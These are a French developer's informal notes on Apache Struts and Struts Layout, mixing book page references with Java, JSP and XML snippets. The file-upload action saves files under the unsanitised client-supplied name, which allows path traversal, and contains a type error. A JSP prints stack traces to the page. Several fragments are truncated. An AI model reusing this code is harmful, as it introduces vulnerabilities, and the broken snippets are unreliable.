la validation n'est pas chargee par l'action. Si il y a des erreurs lors de la validation, automatiquement struts va rediriger vers le forward "input"(struts-config.xml). Et si "input" n'est pas defini comme forward pour l'action, struts essaye de trouver la jsp qui fait office d'input tout seul.
traduction ds ttes les langues + utilisation des tiles p41
ressource boundle p50
et pour recuperer en java les proprietes dans application ressource: traduction libelle
				(pour recuperer la ressource pae.properties sous repertoire classe: ResourceBundle.getRessource("pae");) 
				et apres tu accedes a tes properties String toto = servletContext.messageResources.getMessage("label.ftp.adress" );
				ou bien comme ca:
						ResourceBundle appResources = ResourceBundle.getBundle("ApplicationResources"); ou ResourceBundle.getBundle("ApplicationResources", new Locale("en", "GB")); si on veut forcer la langue
						String login = appResources.getString("db2.user.login" );
						
				  dans struts-config.xml :
				  <!-- Ressources de message -->
				   <message-resources factory="renault.rad.struts.resources.I18NMessageResourcesFactory"  parameter="ApplicationResources"
				   (chemin vers le fichier resource . mais attention ca peut aussi etre une variable definie dans web.xml: <env-entry-name>APP_I18N_CONF...(voir utilisation de web.xml)) null="false"/>
				   <message-resources parameter="ConfResources" key="cle" /> // là, il va chercher sous classes/ConfResources.properties
						Dans une action java:
				       MessageResources messageResources = getResources(request,"cle"); // attention si dans le code j'ai : msgResources = MessageResources.getMessageResources("ContentTypes"); il va du coup chercher dans le ficheir appelle ContentTypes.properties
				       System.out.println(messageResources.getMessage("toto"));
				       ou bien 
									String days = I18NManager.get("SCR012_DAYS", I18NService.getSessionLangue(request)); 
						Dans une jsp:
								<bean:message bundle="cle" key="toto" /> 
logs p51
si pb ds struts-config.xml : p51
acceuil p52methode de la classe action : isCancelled (retour arriere) p 54 (sinon en javascript on peut faire history.back();) mais normalement avec le cancel de struts ca marche
<html:html> pour afficher les caractères etrangers p55
<html:base> pour les images p55
les tags <html> dans un formulaire: html:text <htlm:cancel p57
			exemple: <html:text name="zoneForm" property="zone.commentaire" size="30" maxlength="50" /> (form bean zoneForm contient un bean Zone)
utiliser html:link p60
navigation simple p70
pour pointer vers une autre application p71
protection des jsp p73
utile si on met des jsp d'une auter appli en include dans notre appli struts p75
quand un formulaire a plusieurs actions possibles p76 (aussi pour faire un bouton submit)
				// sans mise en forme
					<layout:form action="/pageAjoutCompte" reqCode="init"> l'attribut name="" (facultatif) doit correspondre au nom du formulaire qu'on a donne dans struts-config.xml pour cette action.
					   <layout:submit reqCode="ajouter">Ajouter</layout:submit>
					   ou
					   		<layout:submit reqCode="search">
								<bean:message key="SYS_SEARCH" />
								</layout:submit>
				// avec mise en forme:
								<layout:submit  styleClass="RnoButton" reqCode="search">
								<bean:message key="SYS_SEARCH" />
								</layout:submit>				
					
							ici quand on va submiter on va appeller la methode ajouter de l'action struts
							dans struts-config.xml il faut mettre ca:
									<action path="/pageAjoutCompte" type="saj.i18n.client.I18NManager" parameter="reqCode">
										(...)
modules struts p83. struts reecrit les liens en ajoutant au href en prefix nom du dernier module visite: il passe de /monaction.do a /monderniermodule/monaction.do Pour appeller une action de aucun module (qui est dans struts-config.xml) a partir d'une jsp, il faut ecrire son lien comme ca: /monappli/monaction.do
faire son propre framework base sur struts p85
validations liees à  la base de donnee p87
pour eviter une double validation de formulaire (et si user clique sur back) p89
formulaires à  pages multiples p91
enchainement des actions p93:
			code pour le faire:
					public ActionForward executeAction(ActionMapping mapping, ActionForm form, SessionDataManager mgr,HttpServletRequest request, HttpServletResponse response) throws Exception {
		
							ActionForward actionForward;
							ActionMessages messages = new ActionMessages();
							FilterRealiseForm filterRealiseForm = getForm(form);
							String action = request.getParameter(Constants.ACTION);
							String actionId = filterRealiseForm.getActionId();
							if (Constants.INIT_ACTION.equals(action)) {
								actionForward = initAction(mapping, filterRealiseForm, mgr, request, response);
							} else if (Constants.FILTER_ACTION.equals(actionId)) {
								actionForward = filterAction(mapping, filterRealiseForm, mgr, request, response, messages);
							} else {
								actionForward = mapping.findForward(Constants.ECHEC);
							}
							filterRealiseForm.setActionId("");
							if(!messages.isEmpty()){
								saveErrors(request, messages);
							}
							return actionForward;
						}
						et
						private ActionForward filterAction(ActionMapping mapping, FilterRealiseForm filterRealiseForm, SessionDataManager mgr,HttpServletRequest request, HttpServletResponse response, ActionMessages messages) throws Exception {
						{(...)
								return mapping.findForward(Constants.RESULT);
						}
xdoclet p98
validation avec fichier xml p102
dynaforms p110
dynavalidatorform: exemple:
					dans struts-config.xml :
					<form-bean name="userForm"
						type="renault.rad.struts.samples.arca.forms.UserDynaValidatorForm">
						<form-property name="idSelectionForm"
							type="java.lang.String" />
						<form-property name="userIPN" type="java.lang.String" />
						<form-property name="userName" type="java.lang.String" />
						<form-property name="serviceName" type="java.lang.String" />
						<form-property name="appName" type="java.lang.Object" />
						<form-property name="roleName" type="java.lang.Object" />
						<form-property name="appNames" type="java.lang.Object[]" />
						<form-property name="roleNames" type="java.lang.Object[]" />
						<form-property name="treeName" type="java.lang.String" />
						<form-property name="treeDepth" type="java.lang.Integer" />
						<form-property name="maxItems" type="java.lang.Integer" />	
					</form-bean>
					en java dans l'action: 
														UserDynaValidatorForm userDynaValidatorForm = (UserDynaValidatorForm) form; 
														HashMap applications =
														mgr.getArcaBean().getUserApplications(false);
													sortedArray = applications.keySet().toArray();
													Arrays.sort(sortedArray);
													userDynaValidatorForm.set("appNames", sortedArray); 
													String aname=Constants.APP_NAME;
													userDynaValidatorForm.set("appName", aname);
													userDynaValidatorForm.set("roleName", "");
													userDynaValidatorForm.set("idSelectionForm",Integer.toString(hashCode()));
												// set the roles:
															sortedArray =
																(Object[]) mgr
																	.getArcaBean()
																	.getUserApplicationRole(aname)
																	.toArray();
															Arrays.sort(sortedArray);
															userDynaValidatorForm.set("roleNames",sortedArray);
															userDynaValidatorForm.set("roleName",(String) sortedArray[0]);
				je peux maintenant avoir une classe java renault.rad.struts.samples.arca.forms.UserDynaValidatorForm qui herite de DynaValidatorForm
					 et qui contient une methode public ActionErrors validate(
formulaires à  pages multiples p113
les tags jsp p119	
base tag p121
checkboxes et radio p123 (attention les checkebox ne marchent pas avec des boolean mais avec des int)
	checkboxe avec layout:
				exemple checkbox simple (pas dans une liste ou une table:)<layout:collectionItem title="I18N_EXPIMP" sortable="false"><layout:checkbox property="activation" name="typebesoinBean"></layout:checkbox></layout:collectionItem>
				exemple checkbox dans une liste ou une table: (meme principe que smartchekbox mais tout developpe dans la jsp:) il s'attaque directement au attributs du formulaire java
																																			<layout:collectionItem property="activation" title="SYS_ACTIVE" width="5%" sortable="false">			
																																					<input type="checkbox" 
																																								<logic:equal name="typebesoinBean" property="activation" value="1">
																																										checked="checked"
																																								</logic:equal>
																																								 name="activation${typebesoinBean.id}" 
																																								 value="<layout:write  name="typebesoinBean" property="activation"/>" 
																																								onclick="javascript:if(this.checked==true )
																																										{document.forms[0].elements['records[${cle}].activation'].value='1';}
																																										else
																																										{document.forms[0].elements['records[${cle}].activation'].value='0';}">
																																					</input>
																																					<input type="hidden" name="records[${cle}].activation"
																																							<logic:equal name="typebesoinBean" property="activation" value="1">
																																										value="1"
																																							</logic:equal>
																																							<logic:equal name="typebesoinBean" property="activation" value="0">
																																										value="0"
																																							</logic:equal>></input>
																																		</layout:collectionItem>
	checkboxe bonne pratique sans layout: 
			creer la classe SmartCheckboxTag
													package renault.ple.tag;
													import javax.servlet.jsp.JspException;
													import org.apache.struts.taglib.TagUtils;
													import org.apache.struts.taglib.html.CheckboxTag;
													public class SmartCheckboxTag extends CheckboxTag
													{
														protected String formName;	///---
														    public SmartCheckboxTag()
													    {
													        super();
													    }
															public String getFormName() {
															return formName;
														}
														public void setFormName(String arg) {
															formName = arg;
														}
													    public int doStartTag()
													        throws JspException
													    {
													        StringBuffer results = new StringBuffer("<input type=\"checkbox\"");
													        results.append(" name=\"");
													        if(indexed)
													            prepareIndex(results, name);
													        results.append(property);
															results.append("Proxy");
													        results.append("\"");
													        if(accesskey != null)
													        {
													            results.append(" accesskey=\"");
													            results.append(accesskey);
													            results.append("\"");
													        }
													        if(tabindex != null)
													        {
													            results.append(" tabindex=\"");
													            results.append(tabindex);
													            results.append("\"");
													        }
													        results.append(" value=\"");
													        if(value == null)
													            results.append("on");
													        else
													            results.append(value);
													        results.append("\"");
													        if(isChecked())
													            results.append(" checked=\"checked\"");
													        results.append(prepareEventHandlers());
													        results.append(prepareStyles());
																if(formName == null) {
																results.append(" onclick=\"javascript:if(this.checked==true ){document.forms[0].elements['");
															} else {
																results.append(" onclick=\"javascript:if(this.checked==true ){document.");
																results.append(formName);
																results.append(".elements['");
															}
																if(indexed)
																		prepareIndex(results, name);
																		results.append(property);
																		if(formName == null) {
																		results.append("'].value='1';} else { document.forms[0].elements['");
																	} else {
																		results.append("'].value='1';} else { document.");
																		results.append(formName);
																		results.append(".elements['");
																	}
																		if(indexed)
																				prepareIndex(results, name);
																				results.append(property);
																	results.append("'].value='0';}\"");
													        results.append(getElementClose());
																results.append("<input type=\"hidden\"");
															results.append(" name=\"");
															if(indexed)
																prepareIndex(results, name);
																results.append(property);
																results.append("\"");
																results.append(" value=\"");
																if(isChecked())
																	results.append("1");
																else results.append("0");
																results.append("\"");
																results.append(getElementClose());
												        TagUtils.getInstance().write(pageContext, results.toString());
													        text = null;
													        return 2;
													    }
													    public int doAfterBody()
													        throws JspException
													    {
													        if(bodyContent != null)
													        {
													            String value = bodyContent.getString().trim();
													            if(value.length() > 0)
													                text = value;
													        }
													        return 0;
													    }
													    public int doEndTag()
													        throws JspException
													    {
													        if(text != null)
													            TagUtils.getInstance().write(pageContext, text);
													        return 6;
													    }
													    public void release()
													    {
													        super.release();
													        name = "org.apache.struts.taglib.html.BEAN";
													        property = null;
													        text = null;
													        value = null;
													    }
													}
													Dans WEB-INF/struts-html.tld
													ajouter: // attention ne pas oublier à changer le chemin vers la classe
													<tag>
														<name>smartcheckbox</name>
														<tagclass>renault.pae.struts.taglib.html.SmartCheckboxTag</tagclass>
														<attribute>
														<name>formName</name>
														<required>false</required>
														<rtexprvalue>true</rtexprvalue>
														</attribute>
														<attribute>
														<name>accesskey</name>
														<required>false</required>
														<rtexprvalue>true</rtexprvalue>
														</attribute>
														<attribute>
														<name>alt</name>
														<required>false</required>
														<rtexprvalue>true</rtexprvalue>
														</attribute>
														<attribute>
														<name>altKey</name>
														<required>false</required>
														<rtexprvalue>true</rtexprvalue>
														</attribute>
														<attribute>
														<name>disabled</name>
														<required>false</required>
														<rtexprvalue>true</rtexprvalue>
														</attribute>
														<attribute>
														<name>indexed</name>
														<required>false</required>
														<rtexprvalue>true</rtexprvalue>
														</attribute>
														<attribute>
														<name>name</name>
														<required>false</required>
														<rtexprvalue>true</rtexprvalue>
														</attribute>
														<attribute>
														<name>onblur</name>
														<required>false</required>
														<rtexprvalue>true</rtexprvalue>
														</attribute>
														<attribute>
														<name>onchange</name>
														<required>false</required>
														<rtexprvalue>true</rtexprvalue>
														</attribute>
														<attribute>
														<name>onclick</name>
														<required>false</required>
														<rtexprvalue>true</rtexprvalue>
														</attribute>
														<attribute>
														<name>ondblclick</name>
														<required>false</required>
														<rtexprvalue>true</rtexprvalue>
														</attribute>
														<attribute>
														<name>onfocus</name>
														<required>false</required>
														<rtexprvalue>true</rtexprvalue>
														</attribute>
														<attribute>
														<name>onkeydown</name>
														<required>false</required>
														<rtexprvalue>true</rtexprvalue>
														</attribute>
														<attribute>
														<name>onkeypress</name>
														<required>false</required>
														<rtexprvalue>true</rtexprvalue>
														</attribute>
														<attribute>
														<name>onkeyup</name>
														<required>false</required>
														<rtexprvalue>true</rtexprvalue>
														</attribute>
														<attribute>
														<name>onmousedown</name>
														<required>false</required>
														<rtexprvalue>true</rtexprvalue>
														</attribute>
														<attribute>
														<name>onmousemove</name>
														<required>false</required>
														<rtexprvalue>true</rtexprvalue>
														</attribute>
														<attribute>
														<name>onmouseout</name>
														<required>false</required>
														<rtexprvalue>true</rtexprvalue>
														</attribute>
														<attribute>
														<name>onmouseover</name>
														<required>false</required>
														<rtexprvalue>true</rtexprvalue>
														</attribute>
														<attribute>
														<name>onmouseup</name>
														<required>false</required>
														<rtexprvalue>true</rtexprvalue>
														</attribute>
														<attribute>
														<name>property</name>
														<required>true</required>
														<rtexprvalue>true</rtexprvalue>
														</attribute>
														<attribute>
														<name>style</name>
														<required>false</required>
														<rtexprvalue>true</rtexprvalue>
														</attribute>
														<attribute>
														<name>styleClass</name>
														<required>false</required>
														<rtexprvalue>true</rtexprvalue>
														</attribute>
														<attribute>
														<name>styleId</name>
														<required>false</required>
														<rtexprvalue>true</rtexprvalue>
														</attribute>
														<attribute>
														<name>tabindex</name>
														<required>false</required>
														<rtexprvalue>true</rtexprvalue>
														</attribute>
														<attribute>
														<name>title</name>
														<required>false</required>
														<rtexprvalue>true</rtexprvalue>
														</attribute>
														<attribute>
														<name>titleKey</name>
														<required>false</required>
														<rtexprvalue>true</rtexprvalue>
														</attribute>
	 												<attri
														<name>value</name>
														<required>false</required>
														<rtexprvalue>true</rtexprvalue>
														</attribute>
														</tag>
										ET dans la jsp mettre: 
										<div align="center"><html:smartcheckbox name="record" property="abonne" indexed="true" value="1" /></div>
exemple de boutons radio :
		exemple de boutons radio : (definir la valeur par defaut en java)
					<layout:radio key="TRAJET_DIRECT" property="trajetAller" value="direct" onclick="document.forms..."/>
					<layout:radio key="TRAJET_COLLECT" property="trajetAller" value="collectage" onclick="document.forms..."/> 
					<layout:radio key="TRAJET_CG" property="trajetAller" value="centreGroupage" onclick="document.forms..."/>					
														
autre exemple de boutons radio : 
					<td class="RnoInstructionText">
					<input type="radio" name="zone.actifPanel" value="1" 
					<logic:equal name="zoneForm" property="zone.actifPanel" value="1">
					checked="checked"
					</logic:equal>
					 />&nbsp;<bean:message key="YES"/>&nbsp;
					<input type="radio" name="zone.actifPanel" value="0" 
					<logic:equal name="zoneForm" property="zone.actifPanel" value="0">
					checked="checked"
					</logic:equal>
									// ci dessous c'est pour donner une valeur par defaut à l'option NO
										<logic:equal name="zoneForm" property="zone.actifPanel" value="">
											checked="checked"
									</logic:equal>
					 />&nbsp;<bean:message key="NO"/>&nbsp;
					<html:errors (ou messages selon qu'on utilise ActionMessage ou ActionError) property="zoneActifPanelNotValid" />
					(le message doit etre dans applicationressource)
					</td>
					</tr>

css p126
pour afficher les erreurs dans une popup javascript p127
submission de formulaire avec une image <html:image p129
ecrire les valeurs des propripetes de beens p135
tag logic p135 p136
tag iterate p137
Si des iterates imbriquees ne fonctionnent pas c'est peut etre parce que un iterate renvoit une ligne null: dans ce cas s'aider de 
<logic:iterate id="premier_iter" ...>
<bean:define id="atester" name="premier_iter"/>
		exemple: <bean:define id="element" name="SeeElementForm"  property="element"/>
	<logic:iterate id="atester"....>
jslt p139
les formulaires listes p 146
faire une liste avec pagination : utilisation de displaytag p148
pour faire une pagination avec struts layout si on veut garder en session le numero de la derniere page (par exemple dans un formulaire pagine), utiliser l'attribut
	sessionpagerid de la balise layout, il faut avant tout initialiser en session comme ceci cet attribut de session: 
	session().setAttribute("nomdemonattributdesession", "0"); apres dans la jsp on mettra un truc qui ressemble a : 
	<layout:pager sessionPagerId="nomdemonattributdesession"...>
	si je dois recuperer une tres grosse liste: utiliser ce pattern p151
	pagination possible et trier avec:
				       <layout:pager maxPageItems="3"> ou <layout:collection property="records" name="i18nUploadDownloadForm" id="fileBean">
				         <layout:collection name="listeComptes">// optionel: id="action" width="100%" property="listAction" styleClass="COLLECTION" styleClass2="COLLECTION_2" sortAction="/gea/auth/ListAction.do?reqCode=search&retour=true" sortParam="colonne" // on recuperera dans l'action: request.getParameter("colonne") 
				         // ci dessous en premier pour faire un lien dynamique
				         		<layout:collectionItem title="I18N_EXPIMP" property="name" sortable="true"><a href='i18n/I18NUploadDownload.do?reqCode=download&fileBeanName=<layout:write name="fileBean" property="name"/>'><layout:write name="fileBean" property="name"/></a></layout:collectionItem>
				           <layout:collectionItem title="pageOngletSimple.listeComptes.userId" property="userId" sortable="true"/>
				           <layout:collectionItem title="pageOngletSimple.listeComptes.password" property="password" sortable="true"/>
				         </layout:collection>
				       </layout:pager> 
				pour que ca marche il est necessaire de mettre dans struts layout les actions path="/sort", path="/page", path = "/treeview" dont les classes sont respectivement fr.improve.struts.taglib.layout.sort.SortAction, ...PageAction, ...layout.treeview.TreviewAction avec scope="request" et validate ="false"
				       
tiles pas lu: p157
i18n pas lu p164
log the exceptions p181
log4j 183
regles des exception p184
eviter de thrower les exception p188 
affichage des exceptions non gerees p190
    dans une jsp: 
    <%
      	exception.printStackTrace(new java.io.PrintWriter(out)) ;
      %>
*****************

Struts :
text area exemple : 
	<html:textarea cols="90" rows="5" name="CommentaryForm" property="notetext" value="<%=note%>" onkeyup="limitTextArea(this, 1000)"></html:textarea>
		function limitTextArea(object, sizeMax)
		{
		if(object.value.length > sizeMax)
			object.value = object.value.slice(0, sizeMax);
		}
		<logic:equal name="reportStatusForm" property="typeReport" value="H">
		faire ca 
		</logic:equal>

logic et reqCode:
    <%=request.getParameter("reqCode") %>
    <logic:equal parameter="reqCode" value="createTables">
    ... 
    </logic:equal>
    <logic:equal parameter="reqCode" value="updateTables">
    ... 
    </logic:equal>

		
utiliser plutot les <html:submit que les <html:link et que les <layout:button (bouton) limite meme pour les redirections.
						<html:submit styleClass="RnoButton" onclick = "javascript:document.zoneForm.action='module/ZoneDetail.do?reqCode=init';"><bean:message key="01506" /></html:submit>
exemple de layout:button:
			<layout:button onclick="moveUp(document.getElementsByName('typeBesoinOne.typeBesoinTwo')[0]);updateList(document.getElementsByName('typeBesoinOne.typeBesoinTwo')[0], document.getElementById('newList'));"> <bean:message key="SYS_SEARCH" /></layout:button>(on ne peut pas mettre dimage la dedans. dans ce cas utiliser layout:link)
Si on a une erreur de type "Instanciation" quelquechose... 
		c'est parce que nos beans ou forms ne sont pas serialisables.
si une erreur apparait et n'est jamais tracee c'est peut etre parce que applicationressources.properties qui a des valeurs non definies: a l'affichage de la jsp: null pointer non tracee
pour faire des validations en javascript genere:
		validator: http://java.developpez.com/faq/struts/?page=validation#validplugin
dans jsp pour faire un upload de fichier:
<layout:form enctype="multipart/form-data" action="/i18n/I18NUploadDownload" align="center" scope="session" width="40%" reqCode="upload">	
				<layout:file property="file" fileKey="I18N_EXPIMP" key="I18N_EXPIMP"  name="i18nUploadDownloadForm"/>
				dans l'action:
				public ActionForward upload(ActionMapping mapping, ActionForm form,  SajWebSession webSession, HttpServletRequest request, HttpServletResponse response) throws Exception {
		FileManagerForm fileForm =(FileManagerForm)form; 
		InputStream inputStream = fileForm.getFile().getInputStream();
		byte[] fileContents = new byte[fileForm.getFile().getFileSize()];
		inputStream.read(fileContents);
			FileOutputStream outputFile = new FileOutputStream(new File(location + file.getFileName()));// on peut ecrire à la suite dans le fichier en rajouter un argument "append" à true
		FileOutputStream fos = new BufferedOutputStream(outputFile);// on peut ecrire à la suite dans le fichier en rajouter un argument "append" à true
		fos.write(fileContents);
		fos.close();
si la jsp n'arrive pas a acceder aux proprietes getter et setter d'un formulaire
     c'est peut etre parce que les getters et setters sont des methodes statiques! il ne faut pas. (de meme pour les variables en question)

pour que au lancement demarre serveur d'une application lancer automatiquement des classes avec des proporietes en entree:
on fait ca dans struts-config.xml:
	<!-- Renault struts-arca plugin -->
	<plug-in className="com.renault.struts.arca.ARCAPlugIn">
		<set-property property="pathname" value="/WEB-INF/classes/arca-config.xml" />
	</plug-in>
		<!-- Plugin LFT -->
	<plug-in className="com.renault.map.plugin.MapPlugIn">
		<set-property property="pathname" value="/WEB-INF/classes/map-config.xml"/>
	</plug-in>
et dans la classe mapPlugin on ecrit ca: 
	/**
	 * <strong>Objectif</strong> Accesseur pour pathname: Recupere la variable d'environnement map.configuration. 
	 * Si elle n'existe pas recupere la propriete JVM map.configuration. 
	 * Si elle n'existe pas conserve la variable systeme envoyee au pluggin Struts
	 *
	 * @since 4 dec. 07
	 */
	public void initPathname() {		
		String path = System.getenv("map.configuration"); // recupere une variable d'environnement settee sur la machine (unix Sur. et windows?)(utiliser export)LINK4488
		log.info("Valeur de la variable d'environnement map.configuration " + path);
		if (path==null) path=System.getProperty("map.configuration");// recupère prop de la jvm voir LINKù*ù
		log.info("Valeur de la propriete systeme map.configuration " + path);
		if(path != null) {
			this.pathname = path; 
		}
	}
Pour faire une classe action qui execute plusieurs actions en fonction d'un request qu'on lui envoie:
   // conseil : toujours mettre une variable action(+getter et setter) dans son formulaire pour maitriser et savoir sur quelle action on est.
	Quand on appelle l'action:
	http://localhost:8080/TutorialStrutsLayout/nop.do?reqCode=nomDeLaMethode1 
	ou encore
	http://localhost:8080/TutorialStrutsLayout/nop.do?method=nomDeLaMethode2
	dans struts-config.xml :
	       <action path="/nop" type="NOPAction" parameter="reqCode" name="nopForm" validate="false">
						<forward name="form" path="/etape1.jsp"/>
						<forward name="formAndArray" path="/autreAction.do?reqCode=blah"/>
       </action>
	Dans l'action (celle ci doit etendre DispatchAction):
	public class ZoneDetailAction extends DispatchAction....
   	public ActionForward nomDeLaMethode1(ActionMapping mapping, ActionForm form,HttpServletRequest request, HttpServletResponse response) throws Exception 
   	{
              return (mapping.findForward("form"));
   }
   public ActionForward nomDeLaMethode2 (ActionMapping mapping, ActionForm form, HttpServletRequest request, HttpServletResponse response) throws Exception 
   {
              ActionErrors l_actionErrors = new ActionErrors();
       				request.setAttribute("org.apache.struts.action.ERROR", l_actionErrors);
	//toujours penser à definir aussi cette methode (unspecified) comme ca en cas de problème de redirection quelconque, c'est cette methode qui overide la methode parente qui va cacher le problème
		public ActionForward unspecified(ActionMapping mapping, ActionForm form, HttpServletRequest request, HttpServletResponse response) throws Exception 
	{
	


Dans la meme idee voici comment faire un dispatcheur: 
	public ActionForward dispatchAction(ActionMapping mapping, ActionForm form, HttpServletRequest request, HttpServletResponse response) throws Exception 
	{
		ActionForward actionForward=mapping.findForward("result");
		ZoneForm zform = (ZoneForm)form;
		switch (zform.getAction()) voir LINKswcthfdf 
		{ 
		case Constants.CREATE: actionForward = create(mapping, form, request, response); break; // ATTENTION NE PAS OUBLIER BREAK 
		case Constants.UPDATE: actionForward = update(mapping, form, request, response); break;
		default: actionForward = init(mapping, form, request, response);
		
		return actionForward;
		}

		return actionForward; // attention celui ci est modifie par ce que renvoyent les actions create et update
	}
	//toujours penser à definir aussi cette methode (unspecified) comme ca en cas de problème de redirection quelconque, c'est cette methode qui overide la methode parente qui va cacher le problème
		public ActionForward unspecified(ActionMapping mapping, ActionForm form, HttpServletRequest request, HttpServletResponse response) throws Exception 
	{
pour recuperer la valeur de reqCode dans le formulaire (ou meme l'action)
		request.getParameter("reqCode").equals("ceQueJaiEnvoye"))

Pour definir la taille max d'un upload:
	dans Struts-config.xml
		'maxFileSize - The maximum size (in bytes) of a file to be 3ed as a file upload.
		Can be expressed as a number followed by a "K", "M", or "G", 
		which are interpreted to mean kilobytes, megabytes, or gigabytes, respectively. [250M] (optional)'
		So if not set, the upload should be limited to 250 MBytes
       <controller> element of the struts-config.xml to configure file upload: 
					bufferSize - The size (in bytes) of the input buffer used when processing file uploads. Default is 4096. 
					maxFileSize - The maximum size (in bytes) of a file to be accepted as a file upload. Can be expressed as a number followed by a "K", "M", or "G", which are interpreted to mean kilobytes, megabytes, or gigabytes, respectively. Default is 250M. 
					multipartClass - The fully qualified Java class name of the multipart request handler class to be used with this module. Defaults is org.apache.struts.upload.CommonsMultipartRequestHandler. 
					tempDir - Temporary working directory to use when processing file uploads
Si on valide un formulaire apres perte de session et que ca redirige quand meme vers le formulaire au lieu de rediriger sur la page de login
		c'est parce que dans Validate du formulaire il y a un return ActionErrors non vide. (struts passe quand meme dans le validate meme si la session est morte)
		donc vers la fin du validate faire: 
						if (request.getSession(false).isNew()) // mettre false sinon il recree une nouvelle session (voir doc java)
						{
							errors = new ActionErrors();
						}
pour faire une action dans struts sans qu'on ait besoin de faire la classe correspondante: 
			dans struts-config.xml declarrer une action dont le type est org.apache.struts.actions.forwardAction, remplir  l'attribut parameter=tile.vers.la.jsp.quon.veut
pour diriger vers une jsp definie en cas de perte de session mettre ca dans struts-config.xml:
	<global-exceptions>
	<exception key="timeout" type="renault.rad.struts.session.SessionTimeoutException" path="/jsp/timeout.jsp?target=topframe"/>
	<exception type="renault.rad.struts.session.SessionOutException" path="/jsp/sessionout.jsp?target=topframe" key="sessionout"/>
	</global-exceptions>
-----------
Struts Layout :
layout:match ne marche pas c'est de la merde.
exemple de logic :
        <layout:row width="100%">
        	<logic:present name="UserForm" property="user.ipn">
        		<layout:message styleClass="PANEL" key="SCR020_UPD_USER" />
        	</logic:present>
        	<logic:notPresent name="UserForm" property="user.ipn">
        		<layout:message styleClass="PANEL" key="SCR020_ADD_USER" />
        	</logic:notPresent>
        </layout:row>
pour faire dans un tableau des sous-colonnes. Sous colonnes: 
					<layout:collectionTitle title="SCR03_VETUSTE">
									<layout:collectionItem title="SCR03_DER_VERSION" sortable="true" width="20px" style="text-align:center;align:center;vertical-align:center;">
    										(..ma sous colonne..)
									</layout:collectionItem>
									<layout:collectionItem title="SCR03_MAX_TOLE" sortable="true" width="20px" style="text-align:center;align:center;vertical-align:center;">
												(..ma sous colonne..)	
									</layout:collectionItem>
					</layout:collectionTitle>					

pour faire un champ de type recherche arca: 
								<script type="text/javascript">
								var line=0;
								function setArcaIdentifiers(ipn, name)
								{
								document.forms[0].elements['besoinOne.besointwo['+line+'].fournisseurIPN'].value=ipn;
								document.forms[0].elements['besoinOne.besointwo['+line+'].fournisseur'].value=name;
								}
								</script>
							<layout:text property="besoinOne.besointwo[${index}].fournisseur" isRequired="false" key="I18N_EXPIMP" layout="false"/>
										<input type="hidden" name="besoinOne.besointwo[${index}].fournisseurIPN" value="<layout:write layout="false"(sinon il va mettre n'importe quoi en html)) name="besoinForm" property="besoinOne.besointwo[${index}].fournisseurIPN"/>"/>
										<layout:link layout="false" href="#" onclick="javascript: line=${index}; window.open('ArcaPaged.do');" styleClass="RnoButton">
													<html:img page="/../images/pictos/address.gif"/>(il faut peut etre entourer les images de layout:cell)
							</layout:link>
pour faire des tableaux html avec layout: plutot que de faire d'abord les lignes puis les colonnes on fait les colonnes puis les lignes: plus simple à apreander:
							<layout:grid cols="6(tres important a definir ca change toute la mise en page)" align="top">
										<layout:column>
											<layout:row><layout:cell>&nbsp;</layout:cell></layout:row>
											<layout:row><layout:cell>Qui</layout:cell></layout:row>
											<layout:row><layout:cell>Avis conformite</layout:cell></layout:row>
											<layout:row><layout:cell>Commentaire</layout:cell></layout:row>
										</layout:column>
										<layout:column>
											<layout:row><layout:cell>DM FO</layout:cell></layout:row>
											<layout:row><layout:cell>&nbsp;</layout:cell><layout:write name="tabForm" property="tab.avisTabByDMF.name"/></layout:row>
											<layout:row><layout:cell>&nbsp;</layout:cell><layout:write name="tabForm" property="tab.avisTabByDMF.avis"/></layout:row>
											<layout:row><layout:cell>&nbsp;</layout:cell><layout:write name="tabForm" property="tab.avisTabByDMF.commentaire"/></layout:row>
										</layout:column>
										<layout:column>
											<layout:row><layout:cell>Architecte</layout:cell></layout:row>
											<layout:row><layout:cell>&nbsp;</layout:cell><layout:write name="tabForm" property="tab.avisTabByARC.name"/></layout:row>
											<layout:row><layout:cell>&nbsp;</layout:cell><layout:write name="tabForm" property="tab.avisTabByARC.avis"/></layout:row>
											<layout:row><layout:cell>&nbsp;</layout:cell><layout:write name="tabForm" property="tab.avisTabByARC.commentaire"/></layout:row>
										</layout:column>
										<layout:column>
											<layout:row><layout:cell>Industrialisateur</layout:cell></layout:row>
											<layout:row><layout:cell>&nbsp;</layout:cell><layout:write name="tabForm" property="tab.avisTabByIND.name"/></layout:row>
											<layout:row><layout:cell>&nbsp;</layout:cell><layout:write name="tabForm" property="tab.avisTabByIND.avis"/></layout:row>
											<layout:row><layout:cell>&nbsp;</layout:cell><layout:write name="tabForm" property="tab.avisTabByIND.commentaire"/></layout:row>
										</layout:column>
										<layout:column>
											<layout:row><layout:cell>DSPI IPT</layout:cell></layout:row>
											<layout:row><layout:cell>&nbsp;</layout:cell><layout:write name="tabForm" property="tab.avisTabByIPT.name"/></layout:row>
											<layout:row><layout:cell>&nbsp;</layout:cell><layout:write name="tabForm" property="tab.avisTabByIPT.avis"/></layout:row>
											<layout:row><layout:cell>&nbsp;</layout:cell><layout:write name="tabForm" property="tab.avisTabByIPT.commentaire"/></layout:row>
										</layout:column>
										<layout:column>
											<layout:row><layout:cell>DSPI DRT</layout:cell></layout:row>
											<layout:row><layout:cell>&nbsp;</layout:cell><layout:write name="tabForm" property="tab.avisTabByDRT.name"/></layout:row>
											<layout:row><layout:cell>&nbsp;</layout:cell><layout:write name="tabForm" property="tab.avisTabByDRT.avis"/></layout:row>
											<layout:row><layout:cell>&nbsp;</layout:cell><layout:write name="tabForm" property="tab.avisTabByDRT.commentaire"/></layout:row>
										</layout:column>
						</layout:grid>
exemple champ hidden :
			<input type="hidden" name="besoinOne.besointwo[${index}].fournisseurIPN" value="<layout:write name="besoinForm" property="besoinOne.besointwo[${index}].fournisseurIPN"/>"/>
			autre solution:
			<layout:text layout="false" property="idSelectionForm" mode="H,H,H"/>
pour mettre en champ de type date avec calendrier: 
				key c'est le libelle (attention il est obligatoire. Si on ne veut rien ecrire mettre une key type SYS_NOTHING (doit etre presente en base ou dans ApplicationResources)
       <layout:date key="LotSCR001-1Periode" value="dateDeNaissance(a mettre si on veut avoir une valeur par defaut: attention il ne va pas chercher dans l'objet form on dirait)" property="dateDeNaissance(est popule automatiquement)"  patternKey="SYS_DATE_PATTERN" startYear="1970" endYear="2100" size="10" cols="12"/> ou SYS_DATE_PATTERN est dans application ressource et est = dd/MM/yyyy par ex.
       ou 
       <layout:date key="LotSCR001-1Periode" name="lotForm" property="SIA" isRequired="false" /> // pour desactiver le champ de saisie il faut utiliser mode=etcetc(editable etc)
